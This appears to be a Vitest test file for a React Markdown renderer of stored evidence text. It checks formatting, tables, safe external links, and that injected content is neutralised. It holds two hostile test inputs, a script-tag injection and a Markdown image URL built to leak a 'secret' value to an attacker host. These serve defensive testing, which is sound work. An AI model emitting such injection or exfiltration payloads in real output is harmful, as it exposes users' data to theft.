import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { describe, expect, it } from "vitest";

import { EvidenceMarkdown } from "@/components/evidence-markdown";

function render(text: string): string {
  return renderToStaticMarkup(createElement(EvidenceMarkdown, { text }));
}

describe("EvidenceMarkdown", () => {
  it("renders answer structure instead of exposing Markdown markers", () => {
    const html = render(
      ["# Decision", "", "- **Approve** the request", "- Record `PO-42`"].join("\n"),
    );

    expect(html).toMatch(/<h4[^>]*>Decision<\/h4>/);
    expect(html).toMatch(/<ul[^>]*>/);
    expect(html).toContain("<strong");
    expect(html).toContain("Approve</strong>");
    expect(html).toContain("<code");
    expect(html).not.toContain("**Approve**");
  });

  it("renders GFM tables and safe external links", () => {
    const html = render(
      [
        "| Vendor | Result |",
        "| --- | --- |",
        "| Acme | Pass |",
        "",
        "[Evidence](https://example.com/evidence)",
      ].join("\n"),
    );

    expect(html).toMatch(/<table[^>]*>/);
    expect(html).toContain("Acme</td>");
    expect(html).toMatch(/target="_blank"/);
    expect(html).toMatch(/rel="noreferrer noopener"/);
  });

  it("does not interpret raw HTML from stored evidence", () => {
    const html = render('<script>alert("unsafe")</script>');

    expect(html).not.toContain("<script>");
    expect(html).toContain("&lt;script&gt;");
  });

  it("does not load remote images from stored evidence", () => {
    const html = render("![secret row](https://attacker.example/leak?row=secret)");

    expect(html).not.toContain("<img");
    expect(html).not.toContain("attacker.example");
    expect(html).not.toContain('rel="preload"');
    expect(html).toContain("[Image omitted: secret row]");
  });
});
